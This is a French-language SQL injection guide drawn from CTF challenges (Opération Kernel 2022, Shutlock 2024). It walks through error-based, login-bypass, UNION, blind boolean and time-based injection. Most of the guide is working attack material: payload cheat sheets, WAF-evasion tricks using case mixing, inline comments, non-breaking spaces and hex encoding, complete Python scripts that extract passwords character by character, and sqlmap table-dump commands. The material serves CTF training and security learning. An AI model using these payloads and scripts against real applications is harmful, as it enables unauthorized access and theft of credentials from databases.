# SQL Injection — Guide Complet

> 📄 **Challenges réels : `SQL Project 1/2/3` — Opération Kernel 2022 | `Extractor` — Shutlock 2024**

## Table des matières
- [Prérequis](#prérequis)
- [Concepts clés](#concepts-clés)
- [Méthodologie générale](#méthodologie-générale)
- [Technique 1 — Trigger d'une erreur SQL](#technique-1--trigger-dune-erreur-sql)
- [Technique 2 — Login Bypass](#technique-2--login-bypass)
- [Technique 3 — UNION-based SQLi](#technique-3--union-based-sqli)
- [Technique 4 — Blind Boolean-based SQLi](#technique-4--blind-boolean-based-sqli)
- [Technique 5 — Time-based SQLi](#technique-5--time-based-sqli)
- [Bypass de WAF](#bypass-de-waf)
- [Identifier la base de données](#identifier-la-base-de-données)
- [Erreurs fréquentes](#erreurs-fréquentes)
- [Résumé des commandes utiles](#résumé-des-commandes-utiles)

---

## Prérequis

- Comprendre les bases du SQL (SELECT, WHERE, UNION...)
- Avoir `python3` + `requests` installés
- Avoir un proxy type Burp Suite pour intercepter les requêtes
- Comprendre ce qu'est une requête HTTP GET/POST

---

## Concepts clés

### Pourquoi une injection SQL fonctionne

Une injection SQL exploite le fait que l'input utilisateur est **concaténé directement** dans une requête SQL sans être nettoyé :

```php
// Code vulnérable
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
```

Si on envoie `admin' OR '1'='1`, la requête devient :

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

La condition `'1'='1'` est toujours vraie → retourne tous les utilisateurs.

### Les types d'injection

| Type | Principe | Quand l'utiliser |
|:---|:---|:---|
| **Login Bypass** | Court-circuiter la condition WHERE | Formulaire de login sans retour de données |
| **UNION-based** | Ajouter une requête SELECT pour exfiltrer | Quand les données sont affichées dans la page |
| **Blind Boolean** | Poser des questions vrai/faux | Quand la page répond différemment selon le résultat |
| **Time-based** | Mesurer le temps de réponse | Quand aucune différence visible dans la réponse |
| **Error-based** | Provoquer une erreur qui contient des données | Quand les erreurs SQL sont affichées |

---

## Méthodologie générale

```
1. Identifier le point d'injection
   → Tester ' (apostrophe) → erreur SQL ? → injection possible
   → Tester 1=1 vs 1=2 → comportement différent ? → injection possible

2. Identifier le type de réponse
   → Données affichées ?     → UNION-based
   → Oui/Non seulement ?     → Blind Boolean
   → Aucune différence ?     → Time-based
   → Erreur affichée ?       → Error-based

3. Identifier la BDD
   → @@version (MySQL/MariaDB)
   → version() (PostgreSQL)
   → sqlite_version() (SQLite)

4. Cartographier la BDD
   → information_schema.tables  → liste des tables
   → information_schema.columns → liste des colonnes

5. Exfiltrer les données
   → Construire la requête selon le type d'injection
```

---

## Technique 1 — Trigger d'une erreur SQL

Avant tout, on cherche à **confirmer qu'une injection est possible** en provoquant une erreur SQL.

### Test de base

```
Input normal  : admin
Input injecté : admin'
```

Si la page retourne une erreur du type :

```
You have an error in your SQL syntax near ''' at line 1
```

L'injection est confirmée. L'apostrophe a cassé la syntaxe SQL.

### Autres déclencheurs d'erreurs

```sql
'                    -- apostrophe non fermée
''                   -- double apostrophe
\                    -- backslash (escape character)
1/0                  -- division par zéro
```

### Error-based SQLi (MySQL)

Si les erreurs sont affichées dans la page, on peut en extraire des données directement via `EXTRACTVALUE` :

```sql
-- Récupérer la version
1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))

-- Récupérer le nom de la BDD courante
1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))

-- Récupérer les tables
1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))
```

L'erreur retournée contiendra la valeur souhaitée :

```
XPATH syntax error: '~10.6.12-MariaDB'
```

> ⚠️ `EXTRACTVALUE` est limité à 31 caractères par erreur. Utiliser `SUBSTR` pour les longues valeurs.

---

## Technique 2 — Login Bypass

> 📄 **Challenge réel : `SQL Project 1` — Opération Kernel 2022**

### Principe

Court-circuiter la condition WHERE d'un formulaire de login pour s'authentifier sans connaître le mot de passe.

### Requête vulnérable type

```sql
SELECT * FROM users WHERE username = '$input' AND password = '$pass'
```

### Payloads classiques

```sql
-- Bypass username (commente le reste de la requête)
admin' -- -
admin' #
admin'/*

-- Bypass complet (condition toujours vraie)
admin' OR '1'='1
' OR 1=1 -- -
' OR True -- -
```

### Exemple concret

```
username : admin' OR True -- -
password : (n'importe quoi)
```

La requête devient :

```sql
SELECT * FROM users WHERE username = 'admin' OR True -- -' AND password = '...'
```

`OR True` rend la condition toujours vraie, `-- -` commente le reste → authentification réussie.

> ⚠️ **Tester d'abord le bypass simple** — si un WAF est présent, passer aux techniques de bypass avant d'aller plus loin.

---

## Technique 3 — UNION-based SQLi

> 📄 **Challenge réel : `SQL Project 2` — Opération Kernel 2022**

### Principe

`UNION` permet d'ajouter une deuxième requête SELECT dont les résultats s'affichent à la place des résultats normaux. C'est la technique la plus directe quand les données sont visibles dans la page.

### Étape 1 — Trouver le nombre de colonnes

```sql
-- Méthode ORDER BY (incrémente jusqu'à l'erreur)
1 ORDER BY 1 -- -    OK
1 ORDER BY 2 -- -    OK
1 ORDER BY 5 -- -    OK
1 ORDER BY 6 -- -    ERREUR → 5 colonnes

-- Méthode UNION NULL
1 UNION SELECT NULL,NULL,NULL,NULL,NULL -- -   OK → 5 colonnes
```

### Étape 2 — Identifier les colonnes affichées

```sql
1 UNION SELECT 'col1','col2','col3','col4','col5' -- -
```

Les valeurs qui apparaissent dans la page indiquent quelles colonnes sont affichées.

### Étape 3 — Exfiltrer les données

```sql
-- Lister les tables
0 UNION SELECT group_concat(table_name),2,3,4,5 FROM information_schema.tables
WHERE table_schema=database() -- -

-- Lister les colonnes
0 UNION SELECT group_concat(column_name),2,3,4,5 FROM information_schema.columns
WHERE table_name='users' -- -

-- Extraire les données
0 UNION SELECT group_concat(username,':',password),2,3,4,5 FROM users -- -
```

### Exemple réel — SQL Project 2

La requête originale avait 5 colonnes. En utilisant `id=0` pour annuler les résultats normaux et `/**/` à la place des espaces (bypass WAF) :

```
/v2/post.php?id=0/**/union/**/select/**/1,group_concat(username),3,group_concat(password),5/**/from/**/user
```

Décomposé :

```sql
SELECT col1,col2,col3,col4,col5 FROM posts WHERE id=0
UNION
SELECT 1, group_concat(username), 3, group_concat(password), 5 FROM user
```

- `id=0` → aucun résultat normal, seul le UNION s'affiche
- `group_concat()` → concatène tous les résultats en une chaîne
- `/**/` → remplace les espaces (bypass WAF)
- Colonnes 1, 3, 5 → valeurs factices pour respecter le nombre de colonnes

> ⚠️ **`id=0` ou `id=-1`** — utiliser un id qui n'existe pas pour que seule la partie UNION s'affiche.

---

## Technique 4 — Blind Boolean-based SQLi

### Principe

Quand la page ne retourne pas de données mais répond différemment selon que la condition est vraie ou fausse. On exfiltre les données **un caractère à la fois** en posant des questions vrai/faux.

```
question : le 1er caractère du mot de passe est-il 'A' ?
"Found 1 result" → OUI
rien             → NON
```

---

### Variante A — Blind Boolean avec SUBSTR

> 📄 **Challenge réel : `Extractor` — Shutlock 2024**

#### La requête vulnérable supposée

```sql
SELECT * FROM users WHERE username LIKE '%$input%'
```

#### L'injection

```
xxxxx%' OR subStr(passWorD,1,1)='A' OR 'x'='xx
```

Ce qui donne :

```sql
SELECT * FROM users WHERE username LIKE '%xxxxx%'
OR subStr(passWorD,1,1)='A'
OR 'x'='xx%'
```

- `xxxxx%'` → ferme le LIKE avec un username inexistant
- `subStr(passWorD,1,1)='A'` → teste le 1er caractère du mot de passe
- `OR 'x'='xx` → referme proprement la requête

#### Script complet

```python
#!/usr/bin/env python3
import requests
import string

url      = "http://challenges.shutlock.fr:50000"
uri      = "/search?query="
alphabet = string.ascii_uppercase + string.digits

def extract_password():
    password = ""
    inc = 1

    while True:
        found = False
        for car in alphabet:
            # case mixing pour bypasser le WAF
            payload = f"xxxxx%25'+oR+subStr(passWorD,{inc},1)='{car}'+oR+'x'='xx"
            r = requests.get(url + uri + payload)

            if "Found 1 result" in r.text:
                password += car
                inc += 1
                found = True
                print(f"\rMot de passe : {password}", end="")
                break

        if not found:
            print(f"\nMot de passe trouvé : {password}")
            break

extract_password()
```

#### Détail du bypass WAF

```
%25  → % encodé en URL → permet le LIKE '%xxxxx%'
+    → espace encodé en URL
subStr  → case mixing (substr bloqué, subStr passe)
passWorD → case mixing (password bloqué, passWorD passe)
oR      → case mixing (or bloqué, oR passe)
```

---

### Variante B — Blind Boolean avec BINARY et encodage hex

> 📄 **Challenge réel : `SQL Project 3` — Opération Kernel 2022**

#### Le problème : MySQL est insensible à la casse

```sql
-- Sans BINARY (insensible à la casse)
substr(password,1,1)='a'   ← vrai pour 'a' ET 'A'

-- Avec BINARY (sensible à la casse)
binary('a') IN (substr(password,1,1))  ← vrai uniquement pour 'a'
```

#### L'injection

```
(2)and(binary(0x41)%A0in(substr(password,1,1)))
```

- `(2)` → id valide pour avoir un résultat de base
- `binary(0x41)` → `binary('A')` encodé en hex (bypass des guillemets filtrés)
- `%A0` → espace insécable (bypass WAF, ignoré par certains filtres)
- `IN (substr(...))` → vérifie si le caractère correspond

#### Pourquoi encoder en hex ?

```python
hex(ord('A'))   = '0x41'
hex(ord("'"))   = '0x27'  # apostrophe filtrée → 0x27 passe !
hex(ord('"'))   = '0x22'  # guillemet filtré   → 0x22 passe !
```

L'encodage hex permet de comparer n'importe quel caractère sans jamais l'écrire littéralement.

#### Script complet

```python
#!/usr/bin/env python3
import requests
import string

url    = "https://secureblog.challenge.operation-kernel.fr/v3/post.php"
param  = "?id="
target = "2"
leak   = "password"

def extract_data():
    leaked = "HACK{"
    inc    = len(leaked) + 1

    while True:
        found = False
        for car in string.printable:
            hex_car = hex(ord(car))
            payload = f"({target})and(binary({hex_car})%A0in(substr({leak},{inc},1)))"
            r = requests.get(url + param + payload)

            if r.status_code == 200:
                leaked += car
                inc    += 1
                found   = True
                print(f"\rDonnée extraite : {leaked}", end="")
                break

        if not found:
            print(f"\nRésultat final : {leaked}")
            break

extract_data()
```

---

## Technique 5 — Time-based SQLi

> ⚠️ **Exemple générique** — pas de challenge réel disponible pour cette technique.

### Principe

Quand la page ne retourne **aucune différence visible**. On utilise `SLEEP()` pour mesurer le temps de réponse : si la condition est vraie, le serveur attend N secondes.

```
condition vraie  → SLEEP(3) → réponse après 3s
condition fausse → réponse immédiate
```

### Payload de base (MySQL/MariaDB)

```sql
-- Confirmer l'injection
1 AND SLEEP(3) -- -

-- Exfiltrer caractère par caractère
1 AND IF(SUBSTR(password,1,1)='A', SLEEP(3), 0) -- -
```

### Équivalents selon la BDD

| BDD | Fonction | Syntaxe |
|---|---|---|
| MySQL/MariaDB | `SLEEP(n)` | `AND SLEEP(3)` |
| PostgreSQL | `pg_sleep(n)` | `AND 1=(SELECT 1 FROM pg_sleep(3))` |
| SQLite | `randomblob(n)` | `AND 1=randomblob(100000000)` |
| MSSQL | `WAITFOR DELAY` | `WAITFOR DELAY '0:0:3'` |

### Script time-based

```python
#!/usr/bin/env python3
import requests
import string
import time

url   = "http://cible.exemple.fr/search?id="
SLEEP = 3      # secondes
MARGE = 0.5    # tolérance réseau

def est_vrai(payload):
    debut = time.time()
    requests.get(url + payload)
    return (time.time() - debut) >= SLEEP - MARGE

def extract_data(champ):
    leaked = ""
    inc    = 1

    while True:
        found = False
        for car in string.printable:
            payload = f"1+AND+IF(SUBSTR({champ},{inc},1)='{car}',SLEEP({SLEEP}),0)--+-"
            if est_vrai(payload):
                leaked += car
                inc    += 1
                found   = True
                print(f"\rDonnée : {leaked}", end="")
                break

        if not found:
            print(f"\nRésultat : {leaked}")
            break

extract_data("password")
```

> ⚠️ **Le time-based est lent** — 3s par caractère × longueur × alphabet = plusieurs minutes. À utiliser en dernier recours quand aucune autre technique ne fonctionne.

---

## Bypass de WAF

### Case mixing

```
select   → SeLeCt / SELECT
union    → UnIoN / UNION
substr   → subStr / SUBSTR
or       → oR / OR
and      → aNd / AND
```

### Remplacement des espaces

```sql
SELECT/**/username/**/FROM/**/users    -- commentaire inline
SELECT+username+FROM+users             -- + encodé URL
SELECT%20username%20FROM%20users       -- %20 = espace
SELECT%A0username%A0FROM%A0users       -- %A0 = espace insécable
SELECT%09username%09FROM%09users       -- %09 = tabulation
```

### Encodage des caractères filtrés

```python
# Apostrophe filtrée → encoder en hex
"'" → char(0x27)  ou  binary(0x27)

# Guillemet filtré → encoder en hex
'"' → char(0x22)

# Caractère quelconque
'A' → char(65)  ou  0x41
```

### Tester le WAF automatiquement

```python
#!/usr/bin/env python3
import requests
import string

url  = "http://cible.exemple.fr/search?query="
mots = ["select","union","where","or","and","substr","from",
        "having","sleep","like","||","&&"]

print("=== Caractères bloqués ===")
for car in string.printable:
    r = requests.get(url + car)
    if r.status_code != 200:
        print(f"[BLOQUÉ] '{car}'")

print("\n=== Mots-clés SQL ===")
for mot in mots:
    r1 = requests.get(url + mot)
    r2 = requests.get(url + mot.upper())
    s1 = "✅" if r1.status_code == 200 else "❌"
    s2 = "✅" if r2.status_code == 200 else "❌"
    print(f"{mot:12} {s1}  |  {mot.upper():12} {s2}")
```

---

## Identifier la base de données

### Fingerprinting par les erreurs

| Message d'erreur | BDD probable |
|---|---|
| `You have an error in your SQL syntax` | MySQL/MariaDB |
| `ERROR: syntax error at or near` | PostgreSQL |
| `SQLite error` | SQLite |
| `Incorrect syntax near` | MSSQL |

### Fingerprinting par les fonctions

```sql
-- MySQL/MariaDB
SELECT @@version        -- '10.6.12-MariaDB'
SELECT database()       -- BDD courante
SELECT user()           -- utilisateur courant

-- PostgreSQL
SELECT version()
SELECT current_database()

-- SQLite
SELECT sqlite_version()
```

### Cartographier la BDD (MySQL/MariaDB)

```sql
-- Toutes les BDD disponibles
SELECT schema_name FROM information_schema.schemata

-- Tables de la BDD courante
SELECT table_name FROM information_schema.tables
WHERE table_schema = database()

-- Colonnes d'une table
SELECT column_name FROM information_schema.columns
WHERE table_name = 'users'
```

---

## Erreurs fréquentes

### "different number of columns"
→ Le UNION n'a pas le bon nombre de colonnes. Utiliser `ORDER BY N` pour trouver le nombre exact.

### MySQL insensible à la casse
→ Ajouter `BINARY` devant la comparaison : `BINARY SUBSTR(password,1,1)='a'`

### Le résultat est tronqué
→ `group_concat` est limité à 1024 caractères. Utiliser `LIMIT` et `OFFSET` pour paginer :
```sql
SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0
SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 1
```

### Le script blind est très lent
→ Réduire l'alphabet aux caractères probables :
```python
alphabet = string.ascii_lowercase + string.digits + "_{}!"
```

---

## Résumé des commandes utiles

### Cheat sheet MySQL/MariaDB

```sql
-- Confirmer l'injection
'
1 AND 1=1 -- -
1 AND 1=2 -- -

-- Nombre de colonnes
1 ORDER BY N -- -

-- UNION-based
0 UNION SELECT @@version,database(),user() -- -
0 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database() -- -
0 UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='users' -- -
0 UNION SELECT group_concat(username,':',password),2,3 FROM users -- -

-- Blind boolean
1 AND SUBSTR(password,1,1)='a' -- -
1 AND BINARY SUBSTR(password,1,1)='a' -- -
1 AND ASCII(SUBSTR(password,1,1))>64 -- -

-- Time-based
1 AND SLEEP(3) -- -
1 AND IF(SUBSTR(password,1,1)='a',SLEEP(3),0) -- -
```

### sqlmap (automatisation)

```bash
sqlmap -u "http://cible.fr/search?id=1" --dbs
sqlmap -u "http://cible.fr/search?id=1" -D nom_bdd --tables
sqlmap -u "http://cible.fr/search?id=1" -D nom_bdd -T users --dump
sqlmap -u "http://cible.fr/search?id=1" --tamper=space2comment,randomcase
```

---

*Technique : SQL Injection — Boolean Blind, UNION, Time-based, WAF Bypass*
*BDD cible : MySQL / MariaDB*
*Challenges réels : SQL Project 1/2/3 — Opération Kernel 2022, Extractor — Shutlock 2024*
